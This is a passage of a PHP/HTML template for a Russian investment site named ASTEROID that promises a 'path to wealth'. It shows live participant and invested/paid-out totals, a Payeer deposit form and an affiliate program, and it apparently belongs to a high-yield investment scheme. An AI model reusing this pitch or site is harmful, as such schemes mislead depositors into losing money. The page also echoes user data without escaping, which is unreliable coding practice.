2.4-1.9-4.3-6.2-7.3-11.2-7.3-6.7 0-12.2 5.4-12.3 12 0-.3-.1-.6-.1-1 0-4.9 2.9-9.2 7-11.2-4.5-7.2-12.3-12.2-21.3-13 4 5.3 6.5 11.9 6.5 19.1 0 2.6-.3 5-.9 7.4H85c.1-1.1.2-2.1.2-3.2 0-9-3.5-17.2-9.1-23.3l31.8-52.7-1.4-1-37.6 41c1.2 2.6 2 5.4 2.2 8.4-5.8-4.3-12.9-6.9-20.7-6.9-1.8 0-3.5.2-5.3.4 3-1 6.2-1.5 9.5-1.5 4.8 0 9.4 1.1 13.4 3-4.3-9.5-13.8-16.1-24.8-16.1h-.3c1.6-.3 3.2-.5 4.9-.5 1.5 0 3 .2 4.4.4-.9-5.6-5.7-9.8-11.6-9.8-1.4 0-2.8.3-4 .7 0 0 .1 0 .1-.1.4-.2.8-.5 1.2-.7.1-.1.2-.1.4-.2l1.5-.6c.8-.2 1.5-.4 2.4-.4-.3-1.1-1-2.1-1.9-2.8.8-1.1 1.3-2.5 1.3-3.9 0-1.7-.7-3.2-1.8-4.4-.3-.3-.6-.6-1-.9-.2-.1-.4-.3-.5-.4-.2-.1-.4-.2-.5-.3h-.1c-.2-.1-.3-.2-.5-.2h-.1c-.2-.1-.3-.1-.5-.2 0 0-.1 0-.1-.1-.2-.1-.3-.1-.5-.1h-.2c-.2 0-.5-.1-.7-.1v-.1c0-8.6-7-15.6-15.6-15.6-.9 0-1.8.1-2.6.2 1.7-2.2 2.6-4.9 2.6-7.9 0-7.3-5.9-13.2-13.2-13.2-.4 0-.8 0-1.1.1-.4 0-.9.1-1.3.2-.7-1.1-2-1.8-3.4-1.8-.3 0-.6 0-.9.1V254H88c30.7 0 59.2-8.6 82-24.6 1.2-.8 2.3-1.7 3.5-2.5.2-.2.4-.3.7-.5 1.2-.9 2.3-1.8 3.4-2.7 1.1-.9 2.1-1.8 3.2-2.7.3-.2.5-.5.8-.7 1-.9 2.1-1.9 3.1-2.9.8-.8 1.7-1.6 2.5-2.5l1.1-1.1.3-.3c6.8-6.8 12.5-14.4 17.2-22.6z"/><g id="rocket"><g id="spaceship"><path class="spaceship" d="M141.1 87.8c12.9 8.8 24 19.5 33 31.9.2-.1.3-.3.5-.4.3-.2.6-.5.8-.7 5-4.7 9.7-10 13.7-15.9 6.2-9.1 10.5-18.9 13.1-29 5.8-22.4 2.9-46.1-7.7-66.3h-.1C171.7 5 148.7 11.1 130 24.7c-8.4 6.1-15.9 13.8-22.1 22.9-4.2 6.1-7.5 12.6-10 19.2-.1.4-.3.7-.4 1.1-.1.2-.2.5-.3.7 15.7 3.5 30.4 10 43.9 19.2zM155 35.1c6.9-5.3 14.7-7.4 22.1-2.3 1.4 1 2.6 2 3.5 3.1 4.5 5.3 4.2 12 2.4 18.5-.4.9-.7 1.9-1.1 2.8-3.6-1.6-7.1-3.3-10.4-5.3-6.8-4-13.2-8.9-18.8-14.5.8-.9 1.5-1.6 2.3-2.3z"/><path class="spaceship" d="M186.4 133.4a60.7 60.7 0 0 1-14.5-9.8c-.1-.1-.2-.2-.3-.2-.3-.2-.5-.5-.8-.7.8-.7 1.7-1.4 2.5-2.1-9-12.4-20.1-23.1-32.9-31.8-13.4-9.1-28-15.6-43.6-19.3-.4 1.1-.8 2.3-1.1 3.4l.2-1c-.3-.2-.7-.3-1-.5 0 0-.1 0-.1-.1-5.5-2.7-10.4-6.1-14.7-10l-.5-.1L67 124.8l.4.1c4.6-8.1 10.7-14.9 17.8-20.2 1.6-1.1 3.2-2.2 4.8-3.2l2.2-11.2c-.7 7.4-.6 14.9.5 22.3h-.1c3.9 4.2 8.1 8.1 12.7 11.7l-.2 1.9c1.6 1.7 3.3 3.3 5.3 4.6 2 1.4 4.1 2.4 6.3 3.2 0 0 .1 0 .1.1l1.7-.9c5 2.9 10.2 5.4 15.5 7.4-1.4-1.5-2.8-2.9-4.3-4.3h.1c1.5 1.4 2.9 2.9 4.3 4.4l.1.1c6.7-1.6 13.3-4 19.6-7.1l-8.4 5.5c-.3 2-.8 4-1.3 5.9-2.3 8.5-6.3 16.6-12.1 23.8l.2.3 54.4-35.2-.2-.6zm-54.1 3.5c-.3-.1-.6-.3-.9-.4-.9-.4-1.8-.8-2.6-1.2-.3-.1-.5-.2-.8-.4-2.2-1-4.4-2.2-6.5-3.4l4-2c-2.9-2.5-6-4.9-9.3-7.1-3.3-2.2-6.6-4.2-10-6l-.4 4.5c-1.9-1.6-3.8-3.2-5.6-4.8l-.6-.6c-.7-.7-1.4-1.3-2.1-2l-.7-.7c-.9-.9-1.7-1.8-2.5-2.6 1 .4 2 .8 3.1 1.2.1.1.3.1.4.2l2.7 1.2c.1 0 .1.1.2.1 5.5 2.5 10.8 5.5 16 9 3.3 2.2 6.4 4.6 9.3 7.1 1.7 1.4 3.4 2.9 4.9 4.4.1 0 .1.1.2.1l2.1 2.1.3.3c.8.8 1.5 1.6 2.3 2.4-1.2-.4-2.3-.9-3.5-1.4z"/></g><path id="window" class="window" d="M155 35.1c6.9-5.3 14.7-7.4 22.1-2.3 1.4 1 2.6 2 3.5 3.1 4.5 5.3 4.2 12 2.4 18.5-.4.9-.7 1.9-1.1 2.8-3.6-1.6-7.1-3.3-10.4-5.3-6.8-4-13.2-8.9-18.8-14.5.8-.9 1.5-1.6 2.3-2.3z"/></g></svg>		</a>
	</div>

	<nav id="site-navigation" class="main-navigation" role="navigation">
		<ul id="menu-top-nav-1" class="nav">
<li class="menu-item menu-about"><a href="#dtposition4" class="careers container open-position">О проекте</a></li>
<li class="menu-item menu-investment"><a href="#dtposition2" class="careers container open-position">Правила</a></li>
<li class="menu-item menu-faq"><a href="#dtposition1" class="careers container open-position">FAQ</a></li>
<li class="menu-item menu-contact"><a href="#dtposition3" class="careers container open-position">Контакты</a></li>
<li class="menu-item menu-account"><a href="/deposits"><b style="font-weight:600;">Вернуться в кабинет</b></a></li>
<li class="btn menu-item menu-start-a-project menu-exit"><a href="/exit">Выход</a></li></ul>	
		
		<div id="mobilemenu" class="open">
			<div class="nav_bar">
			<ul id="menu-top-nav-1" class="nav">
			<li class="menu-item menu-about"><a href="#dtposition4" class="careers container open-position">О проекте</a></li>
<li class="menu-item menu-investment"><a href="/#dtposition2" class="careers container open-position">Правила</a></li>
<li class="menu-item menu-faq"><a href="#dtposition1" class="careers container open-position">FAQ</a></li>
<li class="menu-item menu-contact"><a href="#dtposition3" class="careers container open-position">Контакты</a></li>
<li class="menu-item menu-account"><a href="/deposits"><b style="font-weight:600;">Вернуться в кабинет</b></a></li>
<li class="btn menu-item menu-start-a-project menu-exit"><a href="/exit">Выход</a></li></ul></div>
		</div>
		<a id="hamburger" href="#" title="Menu">
			<span class="line line-1"></span>
			<span class="line line-2"></span>
			<span class="line line-3"></span>
		</a>
		<!-- Mobile Menu End -->
	</nav>
</header>
<?PHP } ?> 

<?php if(!isset($_GET['page'])){ ?>

<main class="main">
					

<div class="site-banner">
	<canvas class="particle-grid"></canvas>
	<div class="overlay"></div>
	<section class="hero-video"></section>
	<div class="banner"></div>
	
	<div class="wormhole"></div>
<div class="spaceman">
<div class="thespaceman">
<div class="glare"></div>
</div>
</div>
<div class="stars-background"></div>
<canvas id="starcanvas"></canvas>

	<div class="banner-txt">
		<div class="container">
			<div class="intro">ASTEROID - ВАШ ПУТЬ К БОГАТСТВУ!</div>
			<div class="services-txt">
				<span id="st01">Участников: <?=$Users?></span>
				<span class="spacing">/</span>
				<span id="st02">Инвестировано: <?=number_format($AmountDeposits, 2, '.', ' ');?> RUB</span>
				<span class="spacing">/</span>
				<span id="st03">Выплачено: <?=number_format($PayDeposits, 2, '.', ' ');?> RUB</span>
				
				</div>
			<div class="clear"></div>
 <?if(empty($id)){?>
			<div class="herobuttons">
			<a class="btn" href="/reg">Начать зарабатывать<span class="filler"></span></a>
			<a class="btn mobile" href="/reg">Начать зарабатывать<span class="filler"></span></a>
			</div>
<? } else { ?>	
			<div class="herobuttons">
			<a class="btn" href="/deposits">Вернуться в кабинет<span class="filler"></span></a>
			<a class="btn mobile" href="/deposits">Вернуться в кабинет<span class="filler"></span></a>
			</div>
<?PHP } ?> 	
		</div>
	</div>

	<a class="pagedown" href="#home-page">
		<svg class="rocket" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 772.5 1008.2"><path class="ship" fill="#df1f26" d="M679.8 489.5c.2-65.6-11.1-128.7-31.9-187.1C601.7 172.3 508.2 64.6 388 0c-.1 0-.2.1-.3.2-.1 0-.2-.1-.3-.2v.3c-120.2 64-214 171.1-260.9 300.6-21.1 58.4-32.7 121.3-32.9 187-.1 44.3 5 87.3 14.8 128.6h-.1c.5 2.2 1.1 4.4 1.6 6.5.4 1.4.7 2.9 1.1 4.3 90-33.5 184.6-50.5 281.8-50.2 93.1.2 183.7 16.2 270 47.4.3-1.3.7-2.6 1-3.9.6-2.2 1.1-4.3 1.7-6.5-.1 0-.1 0-.2-.1 9.4-40 14.4-81.7 14.5-124.5z"/><path class="ship" fill="#df1f26" d="M769.7 651.1c-34 4.7-69.1 4.9-104.7.1l-2.1-.3c-2.1-.3-4.2-.6-6.2-1 1.9-6.2 3.6-12.4 5.3-18.6-86-31.3-176.4-47.3-269.1-47.5-96.6-.3-190.7 16.6-280.1 50 1.9 6.9 3.8 13.7 5.9 20.5l-2.5-5.9c-2.2.3-4.4.7-6.6 1-.3 0-.6.1-.9.1-36.1 4.8-71.6 4.5-106-.5L0 650.2l149.9 356.7 2.2-.9c-4.5-55.6 3.2-109.7 20.9-159.4 3.9-10.9 8.2-21.6 13-32l-26.5-63c21.2 39.4 47 75.9 76.7 108.8-.2 0-.4.1-.5.1 33.2 7.8 67.3 13 102.2 15.6l5.5 10h-.1c13.4 3.3 27.4 5.1 41.8 5.1 14.4 0 28.4-1.9 41.9-5.2.2 0 .4 0 .6.1l5.4-9.8c34.7-2.4 68.6-7.4 101.6-15-11.7-2.8-23.6-5.2-35.6-7.3.1 0 .2 0 .3-.1 12.1 2.1 24 4.6 35.9 7.4 0-.1.1-.1.1-.2.3.1.5.1.8.2 28-30.6 52.5-64.4 73.1-100.8l-23.5 55.1c5 11 9.5 22.2 13.4 33.7 17 49.4 24.2 103 19.5 158l2.2.9 151.8-355.9-2.9-1.2zm-256 198.3c-1.9.4-3.8.7-5.7 1.1-5.7 1.1-11.4 2-17.1 2.9-1.7.3-3.4.5-5.1.8-14.4 2.2-28.9 3.8-43.6 5l13.1-23.6c-22.9-2.5-46.1-3.8-69.6-3.9-23.5-.1-46.8 1.2-69.6 3.5l12.9 23.6c-14.7-1.3-29.2-3-43.6-5.2-1.7-.3-3.4-.5-5-.8-5.7-.9-11.4-1.9-17.1-3-1.9-.4-3.8-.7-5.7-1.1-7.2-1.4-14.3-3-21.4-4.6 6.4-1.5 12.8-2.8 19.3-4.1.9-.2 1.8-.3 2.7-.5 5.7-1.1 11.5-2.2 17.3-3.1.4-.1.8-.1 1.2-.2 35.5-5.8 71.9-8.9 109-8.8 23.5.1 46.7 1.4 69.6 3.9 13.2 1.4 26.3 3.2 39.3 5.4.4.1.8.1 1.2.2 5.8 1 11.6 2.1 17.3 3.2.9.2 1.8.3 2.7.5 6.4 1.3 12.9 2.7 19.2 4.2-6.9 1.7-14.1 3.2-21.3 4.6z"/><path class="window" fill="#ddd" d="M285.8 269.5c16.4-49.2 47.9-85.7 101.7-85.5 10.1 0 19.4 1.3 27.8 3.6 39.8 11 61.2 45.4 73.7 83.2 1.4 5.8 2.7 11.7 3.8 17.5-23 4.3-46.2 7.2-69.4 8.6-47.3 2.9-94.9-.1-141.6-9.2 1.1-6 2.5-12.1 4-18.2z"/></svg>		<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="scroll-blast" x="0px" y="0px" viewBox="0 0 14.2 27.6" xml:space="preserve" enable-background="new 0 0 14.2 27.6"><path class="a3" d="M7.1,27.6L7.1,27.6c-0.1,0-0.3-0.1-0.4-0.1l-6.6-6.6c-0.2-0.2-0.2-0.5,0-0.7c0.2-0.2,0.5-0.2,0.7,0l6.2,6.2 l6.2-6.2c0.2-0.2,0.5-0.2,0.7,0s0.2,0.5,0,0.7l-6.6,6.6C7.3,27.5,7.2,27.6,7.1,27.6z"/><path class="a2" d="M7.1,17.6L7.1,17.6c-0.1,0-0.3-0.1-0.4-0.1l-6.6-6.6c-0.2-0.2-0.2-0.5,0-0.7c0.2-0.2,0.5-0.2,0.7,0l6.2,6.2 l6.2-6.2c0.2-0.2,0.5-0.2,0.7,0s0.2,0.5,0,0.7l-6.6,6.6C7.3,17.5,7.2,17.6,7.1,17.6z"/><path class="a1" d="M7.1,7.6L7.1,7.6c-0.1,0-0.3-0.1-0.4-0.1L0.1,0.9C0,0.7,0,0.4,0.1,0.2C0.3,0,0.7,0,0.9,0.2l6.2,6.2l6.2-6.2 C13.5,0,13.8,0,14,0.1s0.2,0.5,0,0.7L7.4,7.4C7.3,7.5,7.2,7.6,7.1,7.6z"/></svg>
	</a>
</div>

<? } else { ?>
 <?if(empty($id)){?>
<div class="site-banner" style="height: 300px;">
	<canvas class="particle-grid"></canvas>
	<div class="overlay"></div>
	<section class="hero-video"></section>
	<div class="banner"></div>
	
	<div class="wormhole"></div>
<div class="spaceman">
<div class="thespaceman">
<div class="glare"></div>
</div>
</div>
<div class="stars-background"></div>
<canvas id="starcanvas"></canvas>
	<div class="banner-txt">
		<div class="container" style="padding-top: 60px;">
			<div class="intro">{!TITLE!}</div>
		</div>
	</div>

</div>
<? } else { ?>
<div class="site-banner" style="height: 450px;">
	<canvas class="particle-grid"></canvas>
	<div class="overlay"></div>
	<section class="hero-video"></section>
	<div class="banner"></div>
	
	<div class="wormhole"></div>
<div class="spaceman">
<div class="thespaceman">
<div class="glare"></div>
</div>
</div>
<div class="stars-background"></div>
<canvas id="starcanvas"></canvas>
<?
$user=$db->getOne("SELECT user FROM ss_users WHERE id=?i",$id);
?> 
<?if(!empty($_error)){?><div class="stat" style="display: inline-block;font-size: 14px;color: rgb(255, 255, 255);z-index: 10;right: 23px;bottom: 20px;box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 3px;border: 1px solid rgba(255, 255, 255, 0);line-height: 1.72857143;position: fixed;width: 300px;background: #000000c2;padding: 10px;border-radius: 4px;z-index: 999999;font-family: 'Montserrat', sans-serif;font-weight: 400;"><center><font><?=$_error?></font></div></center><?}?>
<div class="banner-txt">
		<div class="container" style="padding-top: 20px;">
			<div class="intro">Добро пожаловать, <?=$user?>! </div>
<form action="" method="post" style="text-align: center;">	
<input type="hidden" name="do" value="payeer_pay">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<input autocomplete="off" name="m_amount" type="number" placeholder="Введите сумму от 10 до 50000 RUB" size="23" maxlength="35" style="width: 350px;margin-right: 2px;height: 52px;border-radius: 0px;outline: none;font-size: 17px;position: relative;z-index: 999999;padding-right: 20px;border: 1px solid #fff;text-align: center;margin-bottom: 20px;">
<input type="submit" name="submit" id="form" value="Оплатить" style="border-radius: 0px;height: 52px;outline: none;position: relative;z-index: 999999;font-size: 17px;padding: 0px 50px;line-height: 52px;">
</form>
			<div class="services-txt">
				<span id="st01" style="bottom: 0px; opacity: 1;"><a href="/deposits">Депозиты</a></span>
				<span class="spacing" style="opacity: 0.5;">/</span>
				<span id="st02" style="bottom: 0px; opacity: 1;"><a href="/affiliate">Партнерская программа</a></span>
				<span class="spacing" style="opacity: 0.5;">/</span>
				<span id="st03" style="bottom: 0px; opacity: 1;"><a href="/promo">Промо материалы</a></span>
				</div>
	

		</div>
	</div>
</div>
<?}?>
<?}?>